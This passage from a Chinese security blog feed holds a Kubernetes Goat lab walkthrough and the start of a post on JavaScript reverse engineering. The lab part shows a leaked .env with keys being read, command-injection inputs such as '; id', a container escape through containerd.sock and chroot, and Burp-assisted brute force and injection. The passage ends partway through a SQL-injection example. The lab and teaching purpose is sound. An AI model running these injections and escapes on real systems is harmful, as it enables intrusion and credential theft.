30</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirb/common.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">/.git/HEAD            (Status: 200) [Size: 23]</span><br><span class="line">/ping                 (Status: 200) [Size: 4] </span><br></pre></td></tr></table></figure><p>使用git-dumper下载源码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git-dumper http://192.168.200.143:1230/ k8s</span><br></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-<span class="selector-attr">[~]</span></span><br><span class="line">└─$ git-dumper http:<span class="comment">//192.168.200.143:1230/ k8s</span></span><br><span class="line"><span class="selector-attr">[-]</span> Testing http:<span class="comment">//192.168.200.143:1230/.git/HEAD [200]</span></span><br><span class="line"><span class="selector-attr">[-]</span> Testing http:<span class="comment">//192.168.200.143:1230/.git/ [404]</span></span><br><span class="line"><span class="selector-attr">[-]</span> Fetching common files</span><br><span class="line"><span class="selector-attr">[-]</span> Fetching http:<span class="comment">//192.168.200.143:1230/.gitignore [404]</span></span><br><span class="line"><span class="selector-attr">[-]</span> http:<span class="comment">//192.168.200.143:1230/.gitignore responded with status code 404</span></span><br><span class="line"><span class="selector-attr">[-]</span> Fetching http:<span class="comment">//192.168.200.143:1230/.git/hooks/post-commit.sample [404]</span></span><br></pre></td></tr></table></figure><p>进入下载的 git 存储库文件夹进行分析</p><p>我们可以通过查看日志和以前的提交历史来验证 git 历史记录和信息</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)<span class="operator">-</span>[<span class="operator">~</span><span class="operator">/</span>k8s]</span><br><span class="line">└─$ git log                                    </span><br><span class="line"><span class="keyword">commit</span> <span class="number">905</span>dcec070d86ce60822d790492d7237884df60a (HEAD <span class="operator">-</span><span class="operator">&gt;</span> master)</span><br><span class="line">Author: Madhu Akula <span class="operator">&lt;</span>madhu.akula<span class="variable">@hotmail</span>.com<span class="operator">&gt;</span></span><br><span class="line"><span class="type">Date</span>:   Fri Nov <span class="number">6</span> <span class="number">23</span>:<span class="number">42</span>:<span class="number">28</span> <span class="number">2020</span> <span class="operator">+</span><span class="number">0100</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">Final</span> <span class="keyword">release</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">commit</span> <span class="number">3292</span>ff3bd8d96f192a9d4eb665fdd1014d87d3df</span><br><span class="line">Author: Madhu Akula <span class="operator">&lt;</span>madhu.akula<span class="variable">@hotmail</span>.com<span class="operator">&gt;</span></span><br><span class="line"><span class="type">Date</span>:   Fri Nov <span class="number">6</span> <span class="number">23</span>:<span class="number">40</span>:<span class="number">59</span> <span class="number">2020</span> <span class="operator">+</span><span class="number">0100</span></span><br><span class="line"></span><br><span class="line">    Updated the docs</span><br><span class="line"></span><br><span class="line"><span class="keyword">commit</span> <span class="number">7</span>daa5f4cda812faa9c62966ba57ee9047ee6b577</span><br><span class="line">Author: Madhu Akula <span class="operator">&lt;</span>madhu.akula<span class="variable">@hotmail</span>.com<span class="operator">&gt;</span></span><br><span class="line"><span class="type">Date</span>:   Fri Nov <span class="number">6</span> <span class="number">23</span>:<span class="number">39</span>:<span class="number">21</span> <span class="number">2020</span> <span class="operator">+</span><span class="number">0100</span></span><br><span class="line"></span><br><span class="line">    updated the endpoints <span class="keyword">and</span> routes</span><br><span class="line"></span><br><span class="line"><span class="keyword">commit</span> d7c173ad183c574109cd5c4c648ffe551755b576</span><br><span class="line">Author: Madhu Akula <span class="operator">&lt;</span>madhu.akula<span class="variable">@hotmail</span>.com<span class="operator">&gt;</span></span><br><span class="line"><span class="type">Date</span>:   Fri Nov <span class="number">6</span> <span class="number">23</span>:<span class="number">31</span>:<span class="number">06</span> <span class="number">2020</span> <span class="operator">+</span><span class="number">0100</span></span><br><span class="line"></span><br><span class="line">    Inlcuded custom environmental variables</span><br></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">commit</span> d7c173ad183c574109cd5c4c648ffe551755b576</span><br><span class="line"><span class="attribute">Author</span>: Madhu Akula &lt;madhu.akula@hotmail.com&gt;</span><br><span class="line"><span class="attribute">Date</span>:   Fri Nov <span class="number">6</span> <span class="number">23</span>:<span class="number">31</span>:<span class="number">06</span> <span class="number">2020</span> +<span class="number">0100</span></span><br><span class="line"></span><br><span class="line">    <span class="attribute">Inlcuded</span> custom environmental variables</span><br></pre></td></tr></table></figure><p>出现一个有意思的内容</p><p>可以使用以下命令，并输入提交 ID 来查看某个提交</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout d7c173ad183c574109cd5c4c648ffe551755b576</span><br></pre></td></tr></table></figure><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/k8s]</span><br><span class="line">└─$ git checkout d7c173ad183c574109cd5c4c648ffe551755b576</span><br><span class="line">Note: switching <span class="built_in">to</span> <span class="string">&#x27;d7c173ad183c574109cd5c4c648ffe551755b576&#x27;</span>.</span><br><span class="line"></span><br><span class="line">You are <span class="keyword">in</span> <span class="string">&#x27;detached HEAD&#x27;</span> state. You can look around, make experimental</span><br><span class="line">changes <span class="keyword">and</span> commit them, <span class="keyword">and</span> you can discard <span class="keyword">any</span> commits you make <span class="keyword">in</span> this</span><br><span class="line">state <span class="keyword">without</span> impacting <span class="keyword">any</span> branches <span class="keyword">by</span> switching back <span class="built_in">to</span> <span class="keyword">a</span> branch.</span><br><span class="line"></span><br><span class="line">If you want <span class="built_in">to</span> <span class="built_in">create</span> <span class="keyword">a</span> <span class="built_in">new</span> branch <span class="built_in">to</span> retain commits you <span class="built_in">create</span>, you may</span><br><span class="line"><span class="built_in">do</span> so (now <span class="keyword">or</span> later) <span class="keyword">by</span> <span class="keyword">using</span> -c <span class="keyword">with</span> <span class="keyword">the</span> <span class="keyword">switch</span> command. Example:</span><br><span class="line"></span><br><span class="line">  git <span class="keyword">switch</span> -c &lt;<span class="built_in">new</span>-branch-name&gt;</span><br><span class="line"></span><br><span class="line">Or undo this operation <span class="keyword">with</span>:</span><br><span class="line"></span><br><span class="line">  git <span class="keyword">switch</span> -</span><br><span class="line"></span><br><span class="line">Turn off this advice <span class="keyword">by</span> setting config <span class="built_in">variable</span> advice.detachedHead <span class="built_in">to</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">HEAD is now <span class="keyword">at</span> d7c173a Inlcuded custom environmental variables</span><br></pre></td></tr></table></figure><p>现在我们进入了特定的提交历史记录，可以看到该提交中的所有文件、代码、资源和更改。我们可以使用标准的 Linux 实用程序来探索文件系统，看看是否有任何有趣的文件或更改</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -la</span><br></pre></td></tr></table></figure><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/k8s]</span><br><span class="line">└─$ ls -la</span><br><span class="line">total 32</span><br><span class="line">drwxrwxr-x <span class="number"> 3 </span>kali kali<span class="number"> 4096 </span>May<span class="number"> 22 </span>00:05 .</span><br><span class="line">drwx------<span class="number"> 17 </span>kali kali<span class="number"> 4096 </span>May<span class="number"> 22 </span>00:01 ..</span><br><span class="line">-rw-rw-r-- <span class="number"> 1 </span>kali kali <span class="number"> 182 </span>May<span class="number"> 22 </span>00:05 .env</span><br><span class="line">drwxrwxr-x <span class="number"> 7 </span>kali kali<span class="number"> 4096 </span>May<span class="number"> 22 </span>00:05 .git</span><br><span class="line">-rw-rw-r-- <span class="number"> 1 </span>kali kali  <span class="number"> 76 </span>May<span class="number"> 22 </span>00:05 go.mod</span><br><span class="line">-rw-rw-r-- <span class="number"> 1 </span>kali kali<span class="number"> 2432 </span>May<span class="number"> 22 </span>00:05 go.sum</span><br><span class="line">-rw-rw-r-- <span class="number"> 1 </span>kali kali <span class="number"> 284 </span>May<span class="number"> 22 </span>00:05 main.go</span><br><span class="line">-rw-rw-r-- <span class="number"> 1 </span>kali kali  <span class="number"> 95 </span>May<span class="number"> 22 </span>00:05 README.md</span><br></pre></td></tr></table></figure><p>现在我们可以看到一个有趣的点文件，它看起来相当可疑，因为大多数开发人员将环境变量和密钥存储在类似的文件中</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat .env</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/k8s]</span><br><span class="line">└─$ <span class="built_in">cat</span> .<span class="built_in">env</span></span><br><span class="line">[build-code-aws]</span><br><span class="line">aws_access_key_id = AKIVSHD6243H22G1KIDC</span><br><span class="line">aws_secret_access_key = cgGn4+gDgnriogn4g+34ig4bg34g44gg4Dox7c1M</span><br><span class="line">k8s_goat_flag = k8s-goat-51bc78332065561b0c99280f62510bcc</span><br></pre></td></tr></table></figure><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>有时，理想情况下，我们可以访问 Pod、容器，作为审计的一部分，或者由于其他一些漏洞，我们也可以使用不同的方法来解决或实现这一</p><p>我们可以使用以下命令exec进入 pod</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export POD_NAME=$(kubectl get pods --namespace default -l &quot;app=build-code&quot; -o jsonpath=&quot;&#123;.items[0].metadata.name&#125;&quot;)</span><br><span class="line"></span><br><span class="line">kubectl exec -it $POD_NAME -- sh</span><br></pre></td></tr></table></figure><p>**提示：**我们可以使用TruffleHog等开源实用程序而不是手动分析来在 git 提交&#x2F;历史记录中找到泄露的凭据。</p><p>它包含.git文件夹，我们可以trufflehog通过运行以下命令来执行分析</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">trufflehog .</span><br></pre></td></tr></table></figure><h2 id="Docker-in-Docker的漏洞利用"><a href="#Docker-in-Docker的漏洞利用" class="headerlink" title="Docker-in-Docker的漏洞利用"></a>Docker-in-Docker的漏洞利用</h2><ul><li>将学习测试和利用容器 UNIX 套接字错误配置</li><li>能够利用容器并从docker容器中逃逸</li></ul><p>此场景的目标是从正在运行的 docker 容器中跳转到运行该容器的主机系统，并能够访问在同一节点上运行的其他容器并对其执行操作。<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/k8s/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-05-22%20003003.png"></p><p>通过查看应用程序功能并尝试输入和输出，我们发现它存在标准命令注入漏洞。假设它在 Linux 容器中运行，我们可以使用;分隔符来运行&#x2F;传递其他命令。</p><h3 id="方法一-1"><a href="#方法一-1" class="headerlink" title="方法一"></a>方法一</h3><p>大多数使用Docker和在管道中为构建容器的CI &#x2F; CD和管道系统使用称为DIND(docker-in-docker)。在这种情况下,我们尝试利用并访问主机系统。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1; id</span><br></pre></td></tr></table></figure><p>我们可以看到它返回了命令的响应id，现在我们可以分析系统并查看可以获得哪些潜在信息</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; mount</span></span><br></pre></td></tr></table></figure><p>它包含containerd.sock安装到文件系统中，因为它在标准系统中并不常见<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/k8s/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-05-22%20003447.png"></p><p>我们可以看到它&#x2F;custom&#x2F;containerd&#x2F;containerd.sock已挂载在文件系统中，假设它是从主机系统挂载的，我们需要与它进行通信，以便与 UNIX 套接字进行通信</p><p>我们可以使用多种方法与 UNIX 套接字通信containerd.sock。其中一些包括crictl 二进制文件，或者一个简单的curl程序。</p><p>我们可以crictl从互联网上下载静态二进制文件<a href="https://github.com/kubernetes-sigs/cri-tools/releases%E3%80%82">https://github.com/kubernetes-sigs/cri-tools/releases。</a><br>为了确定我们需要哪个二进制文件，我们可以运行以下命令进行系统发现</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;uname -a</span><br></pre></td></tr></table></figure><p>我们可以检查输出以确定系统架构和操作系统，然后将相应的二进制文件下载到容器中。例如，如果我们的目标系统是 x86_64 Linux 系统，我们可以使用以下命令</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">;uname -a</span></span><br><span class="line">Response Output</span><br><span class="line"></span><br><span class="line">Linux health-check-deployment<span class="number">-7</span>f<span class="number">4</span>fc<span class="number">7</span><span class="keyword">c</span><span class="number">947</span>-tw<span class="number">6</span>cs <span class="number">6.12</span>.<span class="number">0</span><span class="number">-82</span>.el<span class="number">10</span>.<span class="keyword">x</span><span class="number">86</span>_<span class="number">64</span> <span class="variable">#1</span> SMP PREEMPT_DYNAMIC Wed May <span class="number">7</span> <span class="number">19</span>:<span class="number">48</span>:<span class="number">55</span> UTC <span class="number">2025</span> <span class="keyword">x</span><span class="number">86</span>_<span class="number">64</span> GNU/Linux</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;wget https://github.com/kubernetes-sigs/cri-tools/releases/download/v1.27.1/crictl-v1.27.1-linux-amd64.tar.gz -O /tmp/crictl-v1.27.1.tar.gz</span><br></pre></td></tr></table></figure><p>我们可以从文件中提取二进制文件，crictl-v1.27.1.tgz以便我们可以使用它与 UNIX 套接字进行通信</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;tar -xvf /tmp/crictl-v1.27.1.tar.gz -C /tmp/</span><br></pre></td></tr></table></figure><p>现在我们可以通过运行以下 crictl 命令并传递containerd.sockUNIX 套接字来访问主机系统</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;/tmp/crictl -r unix:///custom/containerd/containerd.sock images</span><br></pre></td></tr></table></figure><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/k8s/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-05-22%20215842.png"><br>执行命令后，可以看到主机系统中有很多容器镜像。我们可以使用不同的 crictl 命令来获得更多访问权限并进一步利用。</p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/k8s/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-05-22%20222111.png"></p><h2 id="Kubernetes（K8S）中的SSRF"><a href="#Kubernetes（K8S）中的SSRF" class="headerlink" title="Kubernetes（K8S）中的SSRF"></a>Kubernetes（K8S）中的SSRF</h2><p>在场景结束时，我们将理解并学习以下内容</p><ul><li>如何利用云环境中应用程序中的 SSRF 漏洞</li><li>了解元数据查询功能以获取云提供商数据的访问权限</li><li>理解并利用 Kubernetes 原生服务发现功能和服务 DNS 查询</li><li>访问集群环境内的内部微服务</li></ul><h2 id="容器逃逸到主机系统"><a href="#容器逃逸到主机系统" class="headerlink" title="容器逃逸到主机系统"></a>容器逃逸到主机系统</h2><p>在本场景结束时，您将理解并学习以下内容：</p><ul><li>能够利用容器并从docker容器中逃逸</li><li>您将学习测试和利用配置错误和特权容器</li><li>了解容器、Kubernetes 和集群环境中的常见配置错误及其可能造成的损害<br>使用mount查看挂载信息</li></ul><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/k8s/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-05-22%20230330.png"><br>查看&#x2F;host-system<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/k8s/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-05-22%20230543.png"></p><p>将当前系统的根目录更改为 “&#x2F;host-system”。这意味着系统将认为 “&#x2F;host-system” 是根目录，并且所有的相对路径都是从 “&#x2F;host-system” 开始的。执行 “chroot &#x2F;host-system bash” 后，您将进入到一个以 “&#x2F;host-system” 为根目录的新环境，并且可以在其中运行 bash。<br>使用以下方式获取主机系统权限chroot</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chroot /host-system bash</span><br></pre></td></tr></table></figure><p>执行docker ps<br>使用kubectl获取pods信息</p><h2 id="Docker-CIS-基准分析"><a href="#Docker-CIS-基准分析" class="headerlink" title="Docker CIS 基准分析"></a>Docker CIS 基准分析</h2><p>这种情况主要是在Kubernetes节点之上执行Docker CIS基准分析,以识别可能的安全漏洞。</p><p>运行服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl apply -f scenarios/docker-bench-security/deployment.yaml</span><br></pre></td></tr></table></figure><p>运行容器应用</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">root</span>@l-virtual-machine:/opt/kubernetes-goat# kubectl get pods</span><br><span class="line"><span class="attribute">NAME</span>                                               READY   STATUS              RESTARTS   AGE</span><br><span class="line"><span class="attribute">batch</span>-check-job-t6mnv                              <span class="number">0</span>/<span class="number">1</span>     Completed           <span class="number">0</span>          <span class="number">6</span>d20h</span><br><span class="line"><span class="attribute">build</span>-code-deployment-<span class="number">7</span>d8969f879-hf88j             <span class="number">1</span>/<span class="number">1</span>     Running             <span class="number">2</span>          <span class="number">6</span>d20h</span><br><span class="line"><span class="attribute">docker</span>-bench-security-<span class="number">6</span>npjf                        <span class="number">0</span>/<span class="number">1</span>     ContainerCreating   <span class="number">0</span>          <span class="number">61</span>s</span><br><span class="line"><span class="attribute">health</span>-check-deployment-fbc7964bc-<span class="number">5</span>l6sx            <span class="number">1</span>/<span class="number">1</span>     Running             <span class="number">2</span>          <span class="number">6</span>d20h</span><br><span class="line"><span class="attribute">hidden</span>-in-layers-<span class="number">9</span>tld6                             <span class="number">1</span>/<span class="number">1</span>     Running             <span class="number">0</span>          <span class="number">136</span>m</span><br><span class="line"><span class="attribute">internal</span>-proxy-deployment-<span class="number">5489</span>c8b584-<span class="number">72</span>mhp         <span class="number">2</span>/<span class="number">2</span>     Running             <span class="number">0</span>          <span class="number">123</span>m</span><br><span class="line"><span class="attribute">kubernetes</span>-goat-home-deployment-<span class="number">655</span>d88c69f-lzb9s   <span class="number">1</span>/<span class="number">1</span>     Running             <span class="number">2</span>          <span class="number">6</span>d20h</span><br><span class="line"><span class="attribute">metadata</span>-db-<span class="number">86</span>d59569fc-nbtx2                       <span class="number">1</span>/<span class="number">1</span>     Running             <span class="number">2</span>          <span class="number">6</span>d20h</span><br><span class="line"><span class="attribute">poor</span>-registry-deployment-<span class="number">597</span>b9fb599-tfdzq          <span class="number">1</span>/<span class="number">1</span>     Running             <span class="number">2</span>          <span class="number">6</span>d20h</span><br><span class="line"><span class="attribute">system</span>-monitor-deployment-<span class="number">5678</span>ccfbc9-tqxsb         <span class="number">1</span>/<span class="number">1</span>     Running             <span class="number">2</span>          <span class="number">6</span>d20h</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl exec -it docker-bench-security-6npjf  -- sh</span><br></pre></td></tr></table></figure><p>执行docker CIS基线分析脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~ <span class="comment"># cd docker-bench-security/</span></span><br><span class="line">~/docker-bench-security <span class="comment"># bash docker-bench-security.sh</span></span><br></pre></td></tr></table></figure><h2 id="K8S-CIS基线分析"><a href="#K8S-CIS基线分析" class="headerlink" title="K8S CIS基线分析"></a>K8S CIS基线分析</h2><p>运行服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kubectl apply -f scenarios/kube-bench-security/node-job.yaml</span><br><span class="line">kubectl apply -f scenarios/kube-bench-security/master-job.yaml</span><br></pre></td></tr></table></figure><p>它是一个检测任务</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">root</span>@l-virtual-machine:~# kubectl get jobs</span><br><span class="line"><span class="attribute">NAME</span>                COMPLETIONS   DURATION   AGE</span><br><span class="line"><span class="attribute">batch</span>-check-job     <span class="number">1</span>/<span class="number">1</span>           <span class="number">37</span>s        <span class="number">6</span>d20h</span><br><span class="line"><span class="attribute">hidden</span>-in-layers    <span class="number">0</span>/<span class="number">1</span>           <span class="number">160</span>m       <span class="number">160</span>m</span><br><span class="line"><span class="attribute">kube</span>-bench-master   <span class="number">1</span>/<span class="number">1</span>           <span class="number">4</span>m33s      <span class="number">22</span>m</span><br><span class="line"><span class="attribute">kube</span>-bench-node     <span class="number">1</span>/<span class="number">1</span>           <span class="number">4</span>m34s      <span class="number">22</span>m</span><br></pre></td></tr></table></figure><p>查看日志，可以看到K8S基线情况。</p>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Js逆向</title>
      <link href="/2025/06/17/JS%E9%80%86%E5%90%91/"/>
      <url>/2025/06/17/JS%E9%80%86%E5%90%91/</url>
      
        <content type="html"><![CDATA[<h1 id="Js逆向"><a href="#Js逆向" class="headerlink" title="Js逆向"></a>Js逆向</h1><h2 id="JS-分析调试："><a href="#JS-分析调试：" class="headerlink" title="JS 分析调试："></a>JS 分析调试：</h2><p><strong>1，代码的全局搜索</strong></p><p>通过数据包找到关键词，并搜索</p><p><strong>2，文件流程断点</strong><br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/%E5%9B%BE%E7%89%87-20-1024x190.png"></p><p>找到对应数据包<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/%E5%9B%BE%E7%89%87-21-1024x197.png"></p><p>在发起程序中，显示了执行 js 的流程，从下往上执行的</p><p>查看 Login js 中的代码，为登录代码</p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/%E5%9B%BE%E7%89%87-22-1024x442.png"></p><p>下个断点，当点击登录时，代码运行此处会暂停</p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/%E5%9B%BE%E7%89%87-23-1024x94.png"></p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/%E5%9B%BE%E7%89%87-24-1024x255.png"></p><p>将鼠标放在 logindata 变量上</p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/%E5%9B%BE%E7%89%87-25-1024x310.png"></p><p>显示了加密信息</p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/%E5%9B%BE%E7%89%87-26.png"></p><p>在作用域中查看信息，发现加密信息是在 login 和 ajax 中完成的</p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/%E5%9B%BE%E7%89%87-27-1024x299.png"><br>上面的代码中显示了加密代码</p><p>点击 encrypt.encrypt () 发现了加密算法的文件</p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/%E5%9B%BE%E7%89%87-28-1024x404.png"></p><p><strong>3，代码标签断点</strong></p><p>右键点击登录事件，检查元素，查看登录的代码标签</p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/%E5%9B%BE%E7%89%87-29-1024x348.png"></p><p>将登录的标签添加断点，点击中断于属性修改</p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/%E5%9B%BE%E7%89%87-30-1024x551.png"></p><p>一但点击登录就会断点，能够查看某些数据</p><p>缺点：有的网站可以这样使用</p><p><strong>4，XHR 提交断点</strong></p><p>先进行请求数据</p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/%E5%9B%BE%E7%89%87-31-1024x92.png"></p><p>抓到数据包后，查看类型是否为 xhr，查看 url，选择具有代表性的地址</p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/%E5%9B%BE%E7%89%87-32.png"></p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/%E5%9B%BE%E7%89%87-33.png"></p><p>在源代码页面中找到 XHR &#x2F; 提取断点，将地址输入进去，勾选内容，让浏览器去请求监控这个地址时进行断点</p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/%E5%9B%BE%E7%89%87-34.png"></p><p>点击登录，成功断点</p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/%E5%9B%BE%E7%89%87-35-1024x331.png"></p><p>通过此方法找到加密算法的文件</p><h2 id="burp-插件-jsEncrypter"><a href="#burp-插件-jsEncrypter" class="headerlink" title="burp 插件 - jsEncrypter"></a>burp 插件 - jsEncrypter</h2><p>jsEncrypter：此插件使用 phantomjs 启动前端加密函数对数据进行加密，phantomjs 会返回加密结果传给 burp。因此此插件需要启动 phantomjs 开启服务，burp 去读取结果。</p><p>需要下载 phantomjs，并且配置环境变量</p><p>下载 jsEncrypte 插件后，在此文件中有 phantomjs_server.js，在此文件中需要将 web 中找到的加密算法的文件保存到本地，并写入此文件中，再编写要对数据加密的代码</p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-04-25-203505.png"></p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/%E5%9B%BE%E7%89%87-38-1024x270.png"></p><p>payload 变量是在 burp 插件中写入的</p><p>启动 phantomjs_server.js</p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/%E5%9B%BE%E7%89%87-36-1024x163.png"></p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/%E5%9B%BE%E7%89%87-37-1024x365.png"></p><p>成功</p><p>用处：</p><p>1，密码爆破：</p><p>在 Intruder 中使用插件</p><p>因为前端对密码进行了加密，但发现了加密算法的文件，使用此插件可对字典中的密码进行加密发送</p><p>2，注入</p><p>因为传入的数据会在请求包中被加密的，所以需要将注入的 payload 进行对应加密后传入参数</p><p>比如 sql 注入 1234’ and 